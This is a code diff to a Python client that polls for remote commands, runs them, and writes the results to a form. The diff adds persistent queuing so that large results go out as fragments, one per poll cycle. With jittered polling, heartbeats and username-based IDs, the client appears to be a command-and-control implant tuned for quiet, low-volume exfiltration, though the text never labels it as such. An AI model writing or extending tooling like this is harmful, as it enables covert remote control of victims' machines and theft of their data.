@@ -16,6 +16,10 @@ HEARTBEAT_EVERY = 10
 # Persistent config file (written by handle_config, loaded on startup)
 _CONFIG_FILE = ".client_config.json"
 
+# Fragment send queue — persisted across cycles, one fragment sent per poll
+_SEND_QUEUE_FILE = ".fragment_send_queue.json"
+_send_queue = []  # list of outbox fragment row dicts
+
 # Known config keys and their defaults
 _KNOWN_CONFIG_KEYS = {"poll_interval_sec", "poll_jitter_min", "poll_jitter_max", "client_id"}
 
@@ -49,6 +53,30 @@ def _save_client_config():
             json.dump(_client_config, f, indent=2)
     except Exception as e:
         print(f"[warn] Failed to save {_CONFIG_FILE}: {e}")
+
+
+def _load_send_queue():
+    """Load persisted fragment send queue from disk."""
+    global _send_queue
+    if not os.path.exists(_SEND_QUEUE_FILE):
+        return
+    try:
+        with open(_SEND_QUEUE_FILE) as f:
+            _send_queue = json.load(f)
+        if _send_queue:
+            print(f"[client] Resumed send queue: {len(_send_queue)} fragment(s) pending")
+    except Exception as e:
+        print(f"[warn] Failed to load {_SEND_QUEUE_FILE}: {e}")
+        _send_queue = []
+
+
+def _save_send_queue():
+    """Persist current send queue to disk."""
+    try:
+        with open(_SEND_QUEUE_FILE, "w") as f:
+            json.dump(_send_queue, f)
+    except Exception as e:
+        print(f"[warn] Failed to save {_SEND_QUEUE_FILE}: {e}")
 
 
 def _get_username():
@@ -176,13 +204,23 @@ def dispatch(task):
             status = "error"
 
     client_id = _client_config.get("client_id", _get_username())
-    return {
+    result_str = json.dumps(result_data)
+    data = {
         "command_id": task["command_id"],
         "client_id": client_id,
         "status": status,
-        "result": json.dumps(result_data),
+        "result": result_str,
         "timestamp": datetime.now(timezone.utc).isoformat(),
     }
+
+    # Fragment large results — write first chunk now, queue the rest
+    fragmenter = common.get_fragmenter()
+    chunks = fragmenter.fragment(result_str)
+    if len(chunks) > 1:
+        frags = common.build_outbox_fragments(data, chunks)
+        data["_fragments"] = frags  # carry fragments for main loop to handle
+
+    return data
 
 
 def send_heartbeat():
@@ -207,6 +245,7 @@ def send_heartbeat():
 def main():
     common.load_env()
     _load_client_config()
+    _load_send_queue()
 
     processed = set()
     cycle = 0
@@ -239,6 +278,19 @@ def main():
             if t.get("status") == "pending" and t.get("command_id") not in processed
         ]
 
+        # Flush one queued fragment before processing new commands
+        if _send_queue:
+            frag = _send_queue[0]
+            ok = common.write_form(frag)
+            if ok:
+                _send_queue.pop(0)
+                _save_send_queue()
+                remaining = len(_send_queue)
+                print(f"[client] Fragment sent for {frag['command_id']} "
+                      f"({frag['status']}) — {remaining} remaining in queue")
+            else:
+                print(f"[warn] Fragment write failed for {frag['command_id']}, will retry next cycle")
+
         if pending:
             print(f"[info] {len(pending)} pending command(s)")
 
@@ -246,12 +298,29 @@ def main():
             tid = task.get("command_id", "?")
             print(f"[info] executing command {tid} ({task.get('command')})")
             result = dispatch(task)
-            ok = common.write_form(result)
-            if ok:
-                processed.add(tid)
-                print(f"[info] command {tid} done, result written")
+            frags = result.pop("_fragments", None)
+
+            if frags:
+                # Send first fragment now; queue the rest for subsequent cycles
+                ok = common.write_form(frags[0])
+                if ok:
+                    processed.add(tid)
+                    if len(frags) > 1:
+                        _send_queue.extend(frags[1:])
+                        _save_send_queue()
+                        print(f"[info] command {tid}: fragment 0/{len(frags)-1} sent, "
+                              f"{len(frags)-1} queued")
+                    else:
+                        print(f"[info] command {tid} done (single fragment)")
+                else:
+                    print(f"[error] command {tid} fragment 0 write failed, will retry next cycle")
             else:
-                print(f"[error] command {tid} result write failed, will retry next cycle")
+                ok = common.write_form(result)
+                if ok:
+                    processed.add(tid)
+                    print(f"[info] command {tid} done, result written")
+                else:
+                    print(f"[error] command {tid} result write failed, will retry next cycle")
 
         # Sleep using current _client_config (may have been updated by a config command)
         try:
